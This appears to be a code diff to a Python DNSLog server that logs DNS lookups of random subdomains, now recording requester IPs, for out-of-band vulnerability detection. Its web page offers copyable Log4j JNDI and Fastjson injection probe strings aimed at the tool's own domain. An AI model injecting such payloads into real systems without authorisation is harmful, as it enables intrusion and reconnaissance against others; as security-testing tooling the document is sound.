@@ -31,7 +31,7 @@ host = ""
 class EchoServerProtocol():
     def __init__(self):
         # dns信息记录
-        # {分类名：[[dns_name,time],...]}
+        # {分类名：[[dns_name,ip,time],...]}
         self.queue = {}
     
     def connection_made(self, transport):
@@ -43,7 +43,7 @@ class EchoServerProtocol():
         response = dns.message.make_response(rec_query)
         answer = dns.rrset.from_text(
             rec_query.question[0].name,
-            300,
+            5,
             dns.rdataclass.IN, # type: ignore
             dns.rdatatype.A, # type: ignore
             '127.0.0.1'
@@ -73,9 +73,9 @@ class EchoServerProtocol():
                 now = datetime.now()
                 time_now = now.strftime("%H:%M:%S")
                 if domain_type not in self.queue:
-                    self.queue[domain_type] = [[recv_domain,time_now]]
+                    self.queue[domain_type] = [[recv_domain,addr[0],time_now]]
                 else:
-                    self.queue[domain_type].append([recv_domain,time_now])
+                    self.queue[domain_type].append([recv_domain,addr[0],time_now])
                 # 删除多余记录
                 if len(self.queue[domain_type]) >= 20:
                     self.queue[domain_type].pop(0)
@@ -116,7 +116,7 @@ class HttpServer(BaseHTTPRequestHandler,EchoServerProtocol):
                 c_domain = f"{random.randint(10, 99)}.{c}.{domain}"
                 html_content = self.generate_html(c_domain)
             else:
-                dns_data:list|None = queue.get(c_value)
+                dns_data = queue.get(c_value)
                 if dns_data is None:
                     dns_data = []
                 html_content = str(dns_data[::-1])
@@ -173,18 +173,15 @@ class HttpServer(BaseHTTPRequestHandler,EchoServerProtocol):
         }}
     </style>
     <script>
-        function copyText() {{
-    var textToCopy = document.getElementById("centered-text").innerText;
-    
-    var tempInput = document.createElement("input");
-    tempInput.setAttribute("value", textToCopy);
-    document.body.appendChild(tempInput);
-    tempInput.select();
-    document.execCommand("copy");
-    document.body.removeChild(tempInput);
-  
-    alert("Domain copied to clipboard!");
-  }}
+        function copyText(content) {{
+  var tempInput = document.createElement("textarea");
+  tempInput.value = content;
+  document.body.appendChild(tempInput);
+  tempInput.select();
+  document.execCommand("copy");
+  document.body.removeChild(tempInput);
+  alert("Text copied to clipboard!");
+}};
 
         function loadDNSData() {{
             var c = document.getElementById("centered-text").innerText;
@@ -201,8 +198,9 @@ class HttpServer(BaseHTTPRequestHandler,EchoServerProtocol):
                     tableBody.innerHTML = "";
                     for (var i = 0; i < response.length; i++) {{
                         var dns = response[i][0];
-                        var time = response[i][1];
-                        var row = "<tr><td>" + dns + "</td><td>" + time + "</td></tr>";
+                        var addr = response[i][1];
+                        var time = response[i][2];
+                        var row = "<tr><td>" + dns + "</td><td>" + addr + "</td><td>" + time + "</td></tr>";
                         tableBody.innerHTML += row;
                     }}
                 }}
@@ -215,21 +213,22 @@ class HttpServer(BaseHTTPRequestHandler,EchoServerProtocol):
 </head>
 <body>
     <div class="centered-text">
-        <h1 class="text" id="centered-text">{0}</h1>
-        <button class="copy-button" onclick="copyText()">Copy Text</button>
-        <div class="container">
+    <h1 class="text" id="centered-text">{0}</h1>
+    <button class="copy-button" onclick="copyText('{0}')">Copy Text</button>
+    <div class="container">
         <p class="text">Log4j: ${{jndi:ldap://{0}/log}}</p>
-        <button class="copy-button" onclick="copyText()">Copy</button>
+        <button class="copy-button" onclick="copyText('{{jndi:ldap://{0}/log}}')">Copy</button>
     </div>
     <div class="container">
         <p class="text">Fastjson: {{"@type":"java.net.Inet4Address","val":"{0}"}}</p>
-        <button class="copy-button" onclick="copyText()">Copy</button>
+        <button class="copy-button" onclick="copyText('{{&#x22;@type&#x22;:&#x22;ava.net.Inet4Address&#x22;,&#x22;val&#x22;:&#x22;{0}&#x22;}}')">Copy</button>
     </div>
-    </div>
+</div>
     <table>
         <thead>
             <tr>
                 <th>Domain</th>
+                <th>Address</th>
                 <th>Time</th>
             </tr>
         </thead>
@@ -256,16 +255,16 @@ async def main():
     # client requests.
     transport, protocol = await loop.create_datagram_endpoint(
         lambda: EchoServerProtocol(), # type: ignore
-        local_addr=(host, 53))
+        local_addr=('0.0.0.0', 53))
     # 创建停止事件
     stop_event = asyncio.Event()
     stop_event.set()
-    httpserver = ThreadingHTTPServer((host, http_port), HttpServer)
+    httpserver = ThreadingHTTPServer(('0.0.0.0', http_port), HttpServer)
     # 封装为异步 HTTPServer
     server = loop.run_in_executor(None, httpserver.serve_forever)
     try:
         # 等待服务器任务完成
-        logger.info(f"Starting domain {domain} Web UI at {host}:{http_port}, use <Ctrl-C> to stop")
+        logger.info(f"Starting dnslog Web UI at {domain}:{http_port}, use <Ctrl-C> to stop")
         await server
         
     except Exception as e:
@@ -281,8 +280,8 @@ async def main():
 if __name__ == '__main__':   
     parser = argparse.ArgumentParser(description='DNSLog')   
     parser.add_argument('--domain', '-dm', help='domain 域名，必要参数', required=True)
+    parser.add_argument('--host', '-i', help='单域名NS IP，必要参数', required=True)
     parser.add_argument('--port', '-p', help='网页端口，非必要参数，默认值8000', default=8000)
-    parser.add_argument('--host', '-i', help='网卡ip，非必要参数，默认值0.0.0.0', default="0.0.0.0")
     args = parser.parse_args()
     try:
         domain = args.domain    
